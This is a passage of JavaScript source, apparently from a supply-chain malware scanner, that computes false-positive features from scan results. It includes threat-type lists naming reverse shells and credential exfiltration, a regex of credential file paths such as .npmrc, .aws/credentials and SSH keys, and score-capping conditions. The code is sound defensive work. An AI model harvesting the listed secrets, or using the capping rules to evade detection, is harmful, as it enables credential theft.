'use strict';

/**
 * ML Feature Extractor — extracts numeric/boolean features from scan results
 * for ML classifier training (Phase 1 of FPR reduction pipeline).
 *
 * Features are designed to capture the discriminative signals between true
 * positives and false positives: threat composition, severity distribution,
 * scoring breakdown, and package metadata.
 *
 * Output: flat object with numeric/boolean values suitable for XGBoost/RF.
 */

// Top threat types by frequency in production (covers ~95% of all findings).
// Types not in this list are aggregated into `threat_type_other`.
// v2.10.32: expanded from 31 to 47 types — code exec bypasses, IoC, GlassWorm,
// obfuscation patterns, module graph sinks. New features will be 0 for pre-existing
// JSONL records; SHAP feature selection handles sparsity gracefully.
const TOP_THREAT_TYPES = [
  // --- Original 31 types ---
  'suspicious_dataflow',
  'env_access',
  'sensitive_string',
  'dangerous_call_eval',
  'dangerous_call_exec',
  'dangerous_call_function',
  'obfuscation_detected',
  'high_entropy_string',
  'dynamic_require',
  'dynamic_import',
  'lifecycle_script',
  'typosquat_detected',
  'staged_payload',
  'staged_binary_payload',
  'network_require',
  'sandbox_evasion',
  'credential_regex_harvest',
  'remote_code_load',
  'suspicious_domain',
  'prototype_hook',
  'intent_credential_exfil',
  'intent_command_exfil',
  'cross_file_dataflow',
  'module_compile',
  'crypto_decipher',
  'env_charcode_reconstruction',
  'lifecycle_shell_pipe',
  'curl_exec',
  'reverse_shell',
  'binary_dropper',
  'mcp_config_injection',
  // --- Code execution bypasses (v2.9.x–v2.10.x) ---
  'vm_code_execution',
  'vm_dynamic_code',
  'dangerous_constructor',
  'module_load_bypass',
  'require_process_mainmodule',
  'proxy_globalthis_intercept',
  'reflect_bind_code_execution',
  // --- IoC / supply chain ---
  'known_malicious_package',
  'known_malicious_hash',
  'dependency_ioc_match',
  // --- GlassWorm (Unicode + Blockchain C2) ---
  'unicode_invisible_injection',
  'blockchain_c2_resolution',
  // --- Shell / exec patterns ---
  'dangerous_exec',
  'node_inline_exec',
  // --- Obfuscation patterns ---
  'js_obfuscation_pattern',
  // --- Module graph / WASM ---
  'suspicious_module_sink',
  'wasm_host_sink'
];

const TOP_THREAT_TYPES_SET = new Set(TOP_THREAT_TYPES);

// --- Cluster FP contextual feature helpers (v2.10.96) ---
//
// Target: P1 CRITICAL webhook suppression (score >= 75). The four helpers
// below encode the four FP clusters identified in the v2.10.9x weekly FP
// review: Cluster A (native binary installers via GitHub releases),
// Cluster B (minified bundles w/o install scripts), Cluster C (dev tooling
// writing git hooks from local files), Cluster E (first-party SDKs exfil
// pattern on their own API).
//
// These features intentionally operate on scan-result signals ONLY so they
// can be recomputed on historical JSONL records without re-scanning.

// Threats whose presence implies the package performs a network call.
const NETWORK_ADJACENT_TYPES = new Set([
  'suspicious_dataflow',
  'network_require',
  'remote_code_load',
  'curl_exec',
  'intent_credential_exfil',
  'intent_command_exfil',
  'dangerous_call_fetch',
  'external_tarball_dep',
  'dependency_url_suspicious'
]);

// Package-scope -> first-party domain mapping for well-known SDK publishers.
// Keys are lowercase npm scope names (without '@'). Used by
// `network_destination_first_party` when the package is scoped.
const SCOPE_FIRST_PARTY_DOMAINS = {
  'anthropic-ai': ['anthropic.com'],
  'openai': ['openai.com'],
  'google-cloud': ['googleapis.com', 'google.com'],
  'google-ai': ['googleapis.com', 'google.com'],
  'aws-sdk': ['amazonaws.com', 'aws.amazon.com'],
  'aws-amplify': ['amazonaws.com'],
  'azure': ['azure.com', 'microsoft.com'],
  'microsoft': ['microsoft.com', 'azure.com'],
  'supabase': ['supabase.co', 'supabase.com'],
  'stripe': ['stripe.com'],
  'twilio': ['twilio.com'],
  'sendgrid': ['sendgrid.com', 'sendgrid.net'],
  'datadog': ['datadoghq.com'],
  'sentry': ['sentry.io'],
  'slack': ['slack.com'],
  'octokit': ['github.com', 'githubusercontent.com'],
  'cloudflare': ['cloudflare.com'],
  'auth0': ['auth0.com'],
  'hubspot': ['hubspot.com', 'hubapi.com'],
  'contentful': ['contentful.com'],
  'mongodb': ['mongodb.com', 'mongodb.net'],
  'mailgun': ['mailgun.net', 'mailgun.com'],
  'vercel': ['vercel.com', 'vercel.app'],
  'netlify': ['netlify.com', 'netlify.app'],
  'pinecone-database': ['pinecone.io'],
  'langchain': ['langchain.com']
};

// GitHub release hosts (install_url_github_releases).
const GITHUB_RELEASE_HOSTS = ['github.com', 'objects.githubusercontent.com', 'raw.githubusercontent.com'];

// Bundle file-shape patterns. Conservative: only flag paths that clearly
// correspond to build output, so the feature stays specific to Cluster B.
const BUNDLE_PATH_RE = /(?:^|[\\/])(?:dist|build|lib|out|umd|esm|cjs|bundle|_next[\\/]static|\.next[\\/]static|public[\\/]static|webpack|rollup)[\\/]/i;
const BUNDLE_FILE_RE = /\.(?:min|bundle|prod|umd|iife|esm|cjs)\.(?:m?js|cjs)$|\.min\.js$|chunk-[0-9a-f]+\.js$|vendors?~?.*\.js$/i;

// v2.11.27 F12: reuse the exhaustive shared regex + veto helper from the
// scanner side (covers @kitware/vtk.js, playwright/lib/utilsBundleImpl,
// .yarn/releases, hash-suffixed chunks, Stencil sys/* dirs — patterns the
// narrower local BUNDLE_PATH_RE misses).
const {
  BUNDLE_PATH_RE: SHARED_BUNDLE_PATH_RE,
  hasBundleVetoSignal
} = require('../shared/bundle-detect.js');

// Threat types that indicate remote content fetch in a file (for
// `git_hook_source_local` heuristic: absence => local source).
const REMOTE_FETCH_TYPES = new Set([
  'remote_code_load',
  'network_require',
  'curl_exec',
  'suspicious_dataflow',
  'suspicious_domain',
  'dangerous_call_fetch',
  'external_tarball_dep',
  'dependency_url_suspicious',
  'binary_dropper',
  'download_exec_binary'
]);

// Match URLs inside threat message strings (legacy fallback when threats
// predate v2.10.96 URL enrichment — historical JSONL scan results).
const MESSAGE_URL_RE = /https?:\/\/([a-zA-Z0-9._-]+)(?:[:/?#][^\s'"`)<>]*)?/g;

function hostFromUrl(url) {
  if (typeof url !== 'string') return null;
  const m = url.match(/^https?:\/\/([^/:?#\s'"`)<>]+)/i);
  return m ? m[1].toLowerCase() : null;
}

function extractHostsFromThreats(threats) {
  const hosts = new Set();
  let sawStructured = false;
  for (const t of threats) {
    if (t && Array.isArray(t.urls) && t.urls.length > 0) {
      sawStructured = true;
      for (const u of t.urls) {
        const h = hostFromUrl(u);
        if (h) hosts.add(h);
      }
    }
  }
  // If no threat carries structured URLs, fall back to message-regex so that
  // callers can still reason about old scan records. Once the scan fleet is
  // fully on v2.10.96+ the regex branch becomes dead.
  if (sawStructured) return hosts;
  for (const t of threats) {
    const msg = t && t.message;
    if (!msg || typeof msg !== 'string') continue;
    MESSAGE_URL_RE.lastIndex = 0;
    let m;
    while ((m = MESSAGE_URL_RE.exec(msg)) !== null) {
      if (m[1]) hosts.add(m[1].toLowerCase());
    }
  }
  return hosts;
}

function hostMatchesSuffix(host, candidates) {
  for (const c of candidates) {
    if (host === c || host.endsWith('.' + c)) return true;
  }
  return false;
}

function getPackageScope(name) {
  if (!name || typeof name !== 'string') return null;
  const m = name.match(/^@([^/]+)\//);
  return m ? m[1].toLowerCase() : null;
}

function getHomepageHost(meta) {
  if (!meta) return null;
  const candidates = [
    meta.homepage,
    meta.registryMeta && meta.registryMeta.homepage,
    meta.npmRegistryMeta && meta.npmRegistryMeta.homepage
  ];
  for (const raw of candidates) {
    if (!raw || typeof raw !== 'string') continue;
    const m = raw.match(/^https?:\/\/([^/:?#]+)/i);
    if (m) return m[1].toLowerCase();
  }
  return null;
}

/**
 * Feature 1 — TRUE iff the package performs a network call AND every
 * extractable destination is a first-party host of that package.
 * First-party = package-scope SDK publisher or package.homepage host.
 *
 * Targets Cluster E: Claude Code / OpenAI / Anthropic SDK wrappers that
 * read API keys from env and POST them to their legitimate vendor API.
 */
function networkDestinationFirstParty(result, meta) {
  const threats = (result && result.threats) || [];
  const hasNetwork = threats.some(t => NETWORK_ADJACENT_TYPES.has(t.type));
  if (!hasNetwork) return false;

  const firstParty = [];
  const scope = getPackageScope(meta && meta.name);
  if (scope && SCOPE_FIRST_PARTY_DOMAINS[scope]) {
    firstParty.push(...SCOPE_FIRST_PARTY_DOMAINS[scope]);
  }
  // Unscoped packages: accept exact-name match against the scope table for
  // packages whose own identifier IS the publisher (e.g., `stripe`, `twilio`).
  const baseName = (meta && meta.name && String(meta.name).replace(/^@[^/]+\//, '').toLowerCase()) || '';
  if (!scope && SCOPE_FIRST_PARTY_DOMAINS[baseName]) {
    firstParty.push(...SCOPE_FIRST_PARTY_DOMAINS[baseName]);
  }
  const homepageHost = getHomepageHost(meta);
  if (homepageHost) firstParty.push(homepageHost);
  if (firstParty.length === 0) return false;

  const hosts = extractHostsFromThreats(threats);
  // No destination host was observable (scanner saw the network sink but
  // no URL literal leaked into threat messages). Accept as first-party only
  // when the package identity alone is a strong signal (scoped SDK).
  if (hosts.size === 0) return scope !== null && SCOPE_FIRST_PARTY_DOMAINS[scope] !== undefined;

  for (const h of hosts) {
    if (!hostMatchesSuffix(h, firstParty)) return false;
  }
  return true;
}

/**
 * Feature 2 — TRUE iff the package behaves as a native-binary installer
 * AND every URL visible in its threat messages points to GitHub releases.
 *
 * Targets Cluster A: esbuild / swc / prisma style platform binary drops.
 */
function installUrlGithubReleases(result) {
  const threats = (result && result.threats) || [];
  const hasInstaller = threats.some(t => t.type === 'binary_dropper' || t.type === 'download_exec_binary');
  if (!hasInstaller) return false;
  // Any known-suspicious destination present => not a github-only installer.
  if (threats.some(t => t.type === 'suspicious_domain')) return false;

  const hosts = extractHostsFromThreats(threats);
  if (hosts.size === 0) return false;
  for (const h of hosts) {
    if (!hostMatchesSuffix(h, GITHUB_RELEASE_HOSTS)) return false;
  }
  // At least one host must be a github release host (guards against the
  // degenerate case where every extracted host happened to be unrelated
  // allowlist traffic — e.g., registry.npmjs.org).
  for (const h of hosts) {
    if (hostMatchesSuffix(h, GITHUB_RELEASE_HOSTS)) return true;
  }
  return false;
}

function hasBundlePath(file) {
  if (!file || typeof file !== 'string') return false;
  return BUNDLE_PATH_RE.test(file) || BUNDLE_FILE_RE.test(file);
}

function hasLifecycleScripts(meta) {
  const scripts = (meta && meta.registryMeta && meta.registryMeta.scripts) || null;
  if (!scripts || typeof scripts !== 'object') return false;
  for (const key of ['preinstall', 'install', 'postinstall']) {
    const v = scripts[key];
    if (typeof v === 'string' && v.trim().length > 0) return true;
  }
  return false;
}

// Threshold derived from the v2.10.9x FP review of minified bundles:
// Cluster B FPs all ship at least one > 100KB file (typical webpack chunk
// is 200-800KB). 100KB is low enough to catch small bundlers yet high
// enough to exclude hand-written source.
const BUNDLE_FILE_MIN_BYTES = 100 * 1024;

/**
 * Feature 3 — TRUE iff the package ships at least one large (>100KB) file
 * AND the findings all sit in those large files AND the package declares
 * no install lifecycle script. Targets Cluster B: minified webpack/rollup
 * output triggering eval / obfuscation heuristics without any runtime
 * install vector.
 *
 * Primary size source: `summary.fileSizes` (populated by processor.js in
 * v2.10.96+). When sizes are absent (historical JSONL records), fall back
 * to the path-shape proxy (`dist/`, `.min.js`, etc.).
 *
 * `registryMeta.scripts` is REQUIRED: callers that do not populate it will
 * always get FALSE — we must not claim a package has no install hook when
 * we never looked.
 */
function bundleWithoutInstallScripts(result, meta) {
  if (!meta || !meta.registryMeta || meta.registryMeta.scripts === undefined) return false;
  if (hasLifecycleScripts(meta)) return false;

  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;

  const threatFiles = new Set();
  for (const t of threats) {
    if (t.file) threatFiles.add(t.file);
  }
  if (threatFiles.size === 0) return false;

  const summary = (result && result.summary) || {};
  const fileSizes = summary.fileSizes;
  const haveSizes = fileSizes && typeof fileSizes === 'object' && Object.keys(fileSizes).length > 0;

  if (haveSizes) {
    let sawLargeFile = false;
    for (const f of threatFiles) {
      const size = fileSizes[f];
      if (typeof size !== 'number') return false;
      if (size < BUNDLE_FILE_MIN_BYTES) return false;
      sawLargeFile = true;
    }
    return sawLargeFile;
  }

  // Legacy proxy: no file sizes available, fall back to path shape.
  for (const f of threatFiles) {
    if (!hasBundlePath(f)) return false;
  }
  return true;
}

/**
 * Feature 4 — TRUE iff the package fires `git_hooks_injection` AND none of
 * the files that triggered it also show a remote-fetch signal. Proxy for
 * "hook body was read from a local source file", i.e. dev tooling like
 * husky / simple-git-hooks installing its own canned hook.
 */
function gitHookSourceLocal(result) {
  const threats = (result && result.threats) || [];
  const hookThreats = threats.filter(t => t.type === 'git_hooks_injection');
  if (hookThreats.length === 0) return false;

  const remoteByFile = new Map();
  for (const t of threats) {
    if (!t.file || !REMOTE_FETCH_TYPES.has(t.type)) continue;
    remoteByFile.set(t.file, true);
  }
  for (const h of hookThreats) {
    if (h.file && remoteByFile.has(h.file)) return false;
  }
  return true;
}

// --- v2.10.96 extended FP features (F5-F8, VPS review 2026-04-18) ---
//
// Covers an additional 319 FP (15.2%) on top of F1-F4; combined F1-F8
// cover 2069/2104 reviewed FP = 98.3%.

// Obfuscation-shape threats used by Feature 6.
const OBFUSCATION_TYPES = new Set([
  'obfuscation_detected',
  'js_obfuscation_pattern',
  'high_entropy_string',
  'unicode_invisible_injection'
]);

// Threat types that indicate a runtime vector (install, env, network).
// Their presence disqualifies Feature 6 (obfuscation-without-vector).
const VECTOR_TYPES = new Set([
  // install / lifecycle
  'lifecycle_script',
  'lifecycle_shell_pipe',
  // env read (credential source)
  'env_access',
  'env_charcode_reconstruction',
  'credential_regex_harvest',
  // network / exec / dynamic code
  'suspicious_dataflow',
  'network_require',
  'remote_code_load',
  'curl_exec',
  'intent_credential_exfil',
  'intent_command_exfil',
  'dangerous_call_fetch',
  'external_tarball_dep',
  'dependency_url_suspicious',
  'dangerous_exec',
  'dangerous_call_eval',
  'dangerous_call_exec',
  'dangerous_call_function',
  'module_compile',
  'binary_dropper',
  'download_exec_binary',
  'fetch_decrypt_exec',
  'suspicious_domain',
  'reverse_shell'
]);

// Threats that indicate a network egress capability somewhere in the
// package. Broader than NETWORK_ADJACENT_TYPES: includes domain literals,
// drop-exec pairs, and suspicious dataflows. Used by Feature 8.
const EGRESS_TYPES = new Set([
  'suspicious_dataflow',
  'network_require',
  'remote_code_load',
  'curl_exec',
  'intent_credential_exfil',
  'intent_command_exfil',
  'dangerous_call_fetch',
  'external_tarball_dep',
  'dependency_url_suspicious',
  'suspicious_domain',
  'binary_dropper',
  'download_exec_binary',
  'fetch_decrypt_exec',
  'reverse_shell'
]);

// Dep-confusion / defensive-placeholder phrases matched against the
// package description. Case-insensitive, whole-phrase (no substring
// inside an unrelated word). The list is deliberately conservative —
// a real README that happens to mention "dependency confusion" once
// still needs to look like a placeholder in every other dimension
// (see `placeholderAntiDepConfusion`).
const PLACEHOLDER_DESCRIPTION_RE = new RegExp([
  'dependency[- ]?confusion',
  'dep[- ]?confusion',
  'namespace[- ]?squatt?ing',
  'name[- ]?squatt?ing',
  'squatting[- ]?prevention',
  'defensive[- ]?(?:registration|publish|package|placeholder)',
  'placeholder[- ]?(?:package|to[- ]?reserve|for[- ]?the[- ]?name)',
  'reserv(?:e|ing|ation)[- ]?(?:this[- ]?)?(?:name|package|namespace)',
  'prevents?[- ]+(?:malicious[- ]+)?dependency[- ]+confusion',
  'blocks?[- ]+(?:malicious[- ]+)?dependency[- ]+confusion',
  'reserved[- ]+by[- ]+.*?(?:to[- ]+prevent|against)'
].join('|'), 'i');

// Alias — same semantics as hasLifecycleScripts (used by F3), just named
// from the perspective of F7/F8 which reason about install vectors.
const hasInstallScript = hasLifecycleScripts;

function getDescription(meta) {
  if (!meta) return '';
  const candidates = [
    meta.description,
    meta.registryMeta && meta.registryMeta.description,
    meta.npmRegistryMeta && meta.npmRegistryMeta.description
  ];
  for (const c of candidates) {
    if (typeof c === 'string' && c.length > 0) return c;
  }
  return '';
}

/**
 * Feature 5 — TRUE iff a `typosquat_detected` threat fires on a scoped
 * package (`@scope/name`). Rationale: the typosquat rule computes edit
 * distance on the bare name (`@vendor/client-foo` -> `client-foo`) and
 * will sometimes treat `@scope/adapter-rubrik` as a typosquat of the
 * unscoped `rubrik`. Scoping implies a separate namespace, so the
 * collision is structurally false.
 *
 * Covers 52 FP (2.5%) on the VPS extended corpus.
 */
function typosquatScopedPackage(result, meta) {
  const threats = (result && result.threats) || [];
  const hasTyposquat = threats.some(t =>
    t.type === 'typosquat_detected' || t.type === 'pypi_typosquat_detected'
  );
  if (!hasTyposquat) return false;
  const name = (meta && meta.name && String(meta.name)) || '';
  return name.startsWith('@') && name.includes('/');
}

/**
 * Feature 6 — TRUE iff the package shows only obfuscation-shape findings
 * (obfuscation_detected, js_obfuscation_pattern, high_entropy_string,
 * unicode_invisible_injection) AND carries no install / env / network
 * vector threat. This is the commercial-obfuscator pattern: webpack
 * output or a hardening vendor (jsjiami, obfuscator.io) trips heuristics
 * but the package has no runtime capability to exfiltrate anything.
 *
 * Mutually exclusive with F8 by construction (F8 requires a lifecycle
 * script, which is a VECTOR_TYPE here).
 *
 * Covers 33 FP (1.6%).
 */
function obfuscationWithoutVector(result) {
  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;
  let sawObf = false;
  for (const t of threats) {
    if (OBFUSCATION_TYPES.has(t.type)) { sawObf = true; continue; }
    if (VECTOR_TYPES.has(t.type)) return false;
  }
  return sawObf;
}

/**
 * Feature 7 — TRUE iff the package description explicitly declares a
 * defensive / placeholder / dependency-confusion-prevention purpose AND
 * the package body is effectively empty (no install script, trivial
 * footprint). These are namespace reservations published by vendors to
 * block attackers from squatting internal package names.
 *
 * Covers 15 FP (0.7%). Conservative double-check (description + empty
 * body) protects against real packages whose README merely mentions
 * dep-confusion as a discussed topic.
 */
function placeholderAntiDepConfusion(result, meta) {
  const desc = getDescription(meta);
  if (!desc || !PLACEHOLDER_DESCRIPTION_RE.test(desc)) return false;
  if (hasInstallScript(meta)) return false;
  const threats = (result && result.threats) || [];
  // Real placeholder packages should not carry any CRITICAL/HIGH static
  // finding — empty by construction.
  for (const t of threats) {
    if (t.severity === 'CRITICAL' || t.severity === 'HIGH') return false;
  }
  return true;
}

// ============================================================================
// Feature 9 — mcp_server_env_access (v2.11.22, audit week3 cluster, 25 FP)
// ============================================================================
//
// Targets legitimate MCP installers / servers (Cachly, Roadmapfy, Llama
// Ventures, Flomenco, Supericons, cf-memory-mcp, mcp-memory-service, etc.)
// that currently score 75-99 from `mcp_config_injection` CRITICAL +
// env_access + credential_regex_harvest triple-stacking on legitimate
// provider-key reads. The conjunction below discriminates them from
// SANDWORM_MODE droppers (which also emit mcp_config_injection) by requiring
// the package to (a) self-identify as MCP, (b) be opt-in (no lifecycle
// hook), (c) read ONLY known provider API keys (not .npmrc / .aws / SSH),
// and (d) show no third-party exfil capability.

// Provider API key env vars that legitimate MCP installers read to populate
// the .mcp.json server config they write to the user's tool dirs.
// Case-sensitive exact-name match; pattern match for *_API_KEY / *_TOKEN /
// MCP_* / .*_KEY is allowed via PROVIDER_KEY_SUFFIX_RE.
const KNOWN_PROVIDER_KEYS_LITERAL = new Set([
  'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'GEMINI_API_KEY', 'GOOGLE_API_KEY',
  'GOOGLE_GENERATIVE_AI_API_KEY',
  'STRIPE_SECRET_KEY', 'STRIPE_PUBLISHABLE_KEY', 'STRIPE_API_KEY', 'STRIPE_KEY',
  'BRAVE_API_KEY', 'FIGMA_TOKEN', 'FIGMA_ACCESS_TOKEN', 'POSTHOG_KEY',
  'PERPLEXITY_API_KEY', 'GROQ_API_KEY', 'COHERE_API_KEY', 'MISTRAL_API_KEY',
  'OPENROUTER_API_KEY', 'TOGETHER_API_KEY', 'DEEPSEEK_API_KEY', 'XAI_API_KEY',
  'SUPABASE_ANON_KEY', 'SUPABASE_URL', 'CLAUDE_API_KEY', 'CLAUDE_KEY',
  'ANTHROPIC_AUTH_TOKEN', 'ANTHROPIC_BASE_URL', 'OPENAI_BASE_URL'
]);
const PROVIDER_KEY_SUFFIX_RE = /^(?:MCP_[A-Z0-9_]+|[A-Z][A-Z0-9_]*_API_KEY|[A-Z][A-Z0-9_]*_TOKEN|[A-Z][A-Z0-9_]*_API_TOKEN)$/;

// Infra / build env vars that any well-behaved package can read without
// disqualifying F9 (their presence doesn't indicate credential harvest).
const F9_INFRA_KEYS = new Set([
  'HOME', 'USERPROFILE', 'XDG_CONFIG_HOME', 'XDG_DATA_HOME', 'XDG_CACHE_HOME',
  'PATH', 'NODE_ENV', 'NODE_PATH', 'DEBUG', 'CI', 'CWD', 'PWD',
  'APPDATA', 'LOCALAPPDATA', 'TEMP', 'TMP', 'TMPDIR', 'SHELL',
  'LANG', 'LC_ALL', 'TERM', 'COLORTERM'
]);

// Credential file paths that a malicious MCP dropper would harvest.
// Appearance in any threat message disqualifies F9.
const F9_CREDENTIAL_FILE_RE = /\.npmrc\b|\.aws[/\\](?:credentials|config)\b|\bid_rsa\b|\bid_ed25519\b|\.ssh[/\\]|\.kube[/\\]config\b|\.docker[/\\]config\b|\.netrc\b|\.git-credentials\b|wallet\.dat\b|\bsecret_token\b/i;

// v2.11.31 F14: split exfil types into HARD (real malware signals) vs
// SOFT (compound/intent threats that legitimately fire on AI proxies +
// MCP installers + vendor CLIs).
//
// Rescan of 107 high-score FPs against v2.11.30 (data/rescan/REPORT.md)
// showed C5 disqualifying 41/42 not-capped packages. Of those, 25 had
// ONLY soft signals — packages doing `process.env.ANTHROPIC_API_KEY` →
// POST `api.anthropic.com`. The intent_*/detached_credential_exfil/
// suspicious_dataflow threats fire on that combo even though the network
// destination is the legit first-party AI provider.
//
// HARD signals always indicate adversary capability: a network host that
// is NOT first-party (suspicious_domain), a binary fetch+exec
// (binary_dropper, download_exec_binary, fetch_decrypt_exec, remote_code_load),
// a non-npm dep (external_tarball_dep, dependency_url_suspicious), a
// shell-out channel (reverse_shell, curl_env_exfil, curl_exec), or a
// covert egress (blockchain_c2_resolution, dns_exfil). Shai-Hulud 2.0/3.0,
// postmark-mcp, and dep-confusion samples all emit ≥1 HARD signal.
//
// SOFT signals are co-occurrence intents — env_read + network_call in the
// same intent or file. Legit on AI proxies; relied on by the malware
// detection only when combined with a HARD signal.
//
// `F9_EXFIL_TYPES` is kept as the union for back-compat (no external
// consumers as of v2.11.30 but the symbol is referenced by older audit
// scripts).
const HARD_EXFIL_TYPES = new Set([
  'suspicious_domain',
  'remote_code_load',
  'fetch_decrypt_exec',
  'reverse_shell',
  'binary_dropper',
  'download_exec_binary',
  'curl_env_exfil',
  'curl_exec',
  'external_tarball_dep',
  'dependency_url_suspicious',
  'blockchain_c2_resolution',
  'dns_exfil'
]);

const SOFT_EXFIL_TYPES = new Set([
  'suspicious_dataflow',
  'intent_credential_exfil',
  'intent_command_exfil',
  'detached_credential_exfil'
]);

// Back-compat union (HARD ∪ SOFT minus detached_credential_exfil which
// was never in F9_EXFIL_TYPES historically; preserve original membership).
const F9_EXFIL_TYPES = new Set([
  ...HARD_EXFIL_TYPES,
  'suspicious_dataflow',
  'intent_credential_exfil',
  'intent_command_exfil'
]);

// MCP identity signals — package SELF-identifies as an MCP installer/server.
const MCP_NAME_RE = /(?:^|[/_-])mcp(?:[_-]|$)|claude[_-]plugin[_-]mcp|mcp[_-](?:server|init|bridge|installer|memory|plugin|core|router|host|client|gateway|relay|stdio|transport|orchestrator)/i;
const MCP_DESC_RE = /\bmodel context protocol\b|\bmcp[ -](?:server|installer|bridge|plugin|memory|core|gateway|relay|orchestrator|transport)\b|\b(?:claude|cursor|windsurf)[ -]mcp\b/i;

function _f9Keywords(meta) {
  const m = (meta && meta.registryMeta) || {};
  return Array.isArray(m.keywords) ? m.keywords.map(k => String(k).toLowerCase()) : [];
}

function _f9HasMcpIdentity(meta) {
  if (!meta) return false;
  const name = String(meta.name || '').toLowerCase();
  if (MCP_NAME_RE.test(name)) return true;
  const desc = (meta.registryMeta && meta.registryMeta.description) || meta.description || '';
  if (MCP_DESC_RE.test(desc)) return true;
  const kw = _f9Keywords(meta);
  for (const k of kw) {
    if (k === 'mcp' || k === 'model-context-protocol' || k === 'model context protocol' ||
        k.startsWith('mcp-') || k.startsWith('mcp_')) return true;
  }
  const bin = meta.registryMeta && meta.registryMeta.bin;
  if (bin && typeof bin === 'object') {
    for (const b of Object.keys(bin)) {
      if (/mcp/i.test(b)) return true;
    }
  } else if (typeof bin === 'string' && /mcp/i.test(bin)) {
    return true;
  }
  return false;
}

/**
 * Feature 9 — TRUE iff the package self-identifies as an MCP installer/server
 * AND emits `mcp_config_injection` (legit scaffolding signal) AND has no
 * install lifecycle script AND its env_access / credential_regex_harvest
 * threats cite ONLY known provider API keys (Anthropic/OpenAI/Stripe/etc.)
 * — never credential files like .npmrc, .aws/credentials, or SSH keys —
 * AND shows no third-party exfil capability.
 *
 * Targets the v2.11 audit week3 cluster of 25 legitimate MCP plugin
 * installers that currently score 75-99 from mcp_config_injection +
 * env_access + credential_regex_harvest triple-stacking. Cap to 30 (MEDIUM).
 *
 * Mutually exclusive with SANDWORM_MODE MCP droppers: condition C3 blocks
 * preinstall/postinstall droppers; C4 blocks .npmrc/SSH/AWS harvests; C5
 * blocks downloaders. None of the 15 MALWARE + 29 PENTEST samples in the
 * week3 audit satisfy all five conditions simultaneously.
 *
 * Covers 25 FP (8.7% of audit week3 FP corpus).
 */
function mcpServerEnvAccess(result, meta) {
  // C1 — MCP identity
  if (!_f9HasMcpIdentity(meta)) return false;
  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;
  // C2 — mcp_config_injection present (the positive signal that the package
  // actually does MCP work, not just claims to)
  if (!threats.some(t => t.type === 'mcp_config_injection')) return false;
  // C3 — no install lifecycle hook
  if (hasLifecycleScripts(meta)) return false;
  // C4 — env_access / credential_regex_harvest must cite only known provider
  // keys (literal whitelist + suffix pattern) or infra vars; never credential
  // file paths
  for (const t of threats) {
    if (t.type !== 'env_access' && t.type !== 'credential_regex_harvest' &&
        t.type !== 'env_charcode_reconstruction') continue;
    const msg = String(t.message || '');
    if (F9_CREDENTIAL_FILE_RE.test(msg)) return false;
    // Extract candidate env var names from the message
    const candidates = msg.match(/\b[A-Z][A-Z0-9_]{2,}\b/g);
    if (!candidates) continue;
    for (const v of candidates) {
      if (KNOWN_PROVIDER_KEYS_LITERAL.has(v)) continue;
      if (PROVIDER_KEY_SUFFIX_RE.test(v)) continue;
      if (F9_INFRA_KEYS.has(v)) continue;
      // Unknown all-caps token in a credential threat message — could be an
      // attacker-specific var. Don't vouch for legitimacy.
      return false;
    }
  }
  // C5 — no HARD third-party exfil capability (v2.11.31 F14: SOFT compound
  // intent threats are intrinsic to MCP installer behaviour — env_read +
  // POST first-party endpoint — and no longer disqualify here. HARD signals
  // — suspicious_domain, binary_dropper, remote_code_load, etc. — still do.)
  for (const t of threats) {
    if (HARD_EXFIL_TYPES.has(t.type)) return false;
  }
  return true;
}

// ============================================================================
// Feature 15 — mcp_server_benign_lifecycle (AUDIT 2, 2026-06)
// ============================================================================
//
// Like F9 (mcpServerEnvAccess) but TOLERATES a benign install lifecycle. F9
// vetoes on ANY preinstall/install/postinstall (its C3), which makes it
// inoperative for the ~77% of legitimate MCP installers that ship a build/setup
// hook (`husky install`, `node build.js`, `tsc`). Those packages stack
// mcp_config_injection (CRIT) + suspicious_dataflow (CRIT, env→first-party POST)
// + env_access (HIGH) + lifecycle_script (MEDIUM) and score ~150 on `muaddib
// scan` — the recurring @recapp/mcp-style false positives in the daily report.
//
// F15 instead allows a lifecycle that is only flagged as a plain MEDIUM/LOW
// `lifecycle_script`, and vetoes the moment the lifecycle does anything
// malicious. Ground-truth safety (verified by replay before/after):
//   GT-060 mcp-config-inject  → vetoed by lifecycle_file_exec (malicious postinstall)
//   GT-088 defi-threat-scanner → vetoed by HARD exfil (suspicious_domain) + cred files
//   GT-066 ai-agent-exploit    → never emits mcp_config_injection (C2 excludes it)
//   GT-097 / GT-099            → HARD exfil / not an mcp_config_injection JS package
// Same cap (30 = MEDIUM) and identity/provider-key machinery as F9.
const F15_LIFECYCLE_MALICE_TYPES = new Set([
  'lifecycle_file_exec',        // postinstall executes a file containing HIGH/CRIT threats
  'lifecycle_dataflow',         // install-time credential read + network send (compound)
  'lifecycle_shell_pipe',       // curl | sh during install
  'lifecycle_missing_script',   // phantom install script (payload injected later)
  'intent_credential_exfil',    // multi-file credential→network intent
  'intent_command_exfil',
  'detached_credential_exfil',
  'staged_payload'
]);

function mcpServerBenignLifecycle(result, meta) {
  // C1 — MCP identity (same as F9)
  if (!_f9HasMcpIdentity(meta)) return false;
  const threats = (result && result.threats) || [];
  if (threats.length === 0) return false;
  // C2 — mcp_config_injection present (proves real MCP work, not just a name claim)
  if (!threats.some(t => t.type === 'mcp_config_injection')) return false;
  // C3' (relaxed) — a lifecycle MAY exist, but it must be benign: no malicious
  // lifecycle compound, and a plain lifecycle_script (if any) must not itself be
  // HIGH/CRITICAL (a benign husky/build hook is MEDIUM/LOW).
  for (const t of threats) {
    if (F15_LIFECYCLE_MALICE_TYPES.has(t.type)) return false;
    if (t.type === 'lifecycle_script' && (t.severity === 'HIGH' || t.severity === 'CRITICAL')) return false;
  }
  // C4 — env_access / credential threats cite ONLY known provider keys or infra
  // vars; never credential file paths (same machinery as F9).
  for (const t of threats) {
    if (t.type !== 'env_access' && t.type !== 'credential_regex_harvest' &&
        t.type !== 'env_charcode_reconstruction') continue;
    const msg = String(t.message || '');
    if (F9_CREDENTIAL_FILE_RE.test(msg)) return false;
    const candidates = msg.match(/\b[A-Z][A-Z0-9_]{2,}\b/g);
    if (!candidates) continue;
    for (const v of candidates) {
      if (KNOWN_PROVIDER_KEYS_LITERAL.has(v)) continue;
      if (PROVIDER_KEY_SUFFIX_RE.test(v)) continue;
      if (F9_INFRA_KEYS.has(v)) continue;
      return false;
    }
  }
  // C5 — no HARD third-party exfil capability (SOFT suspicious_dataflow to a
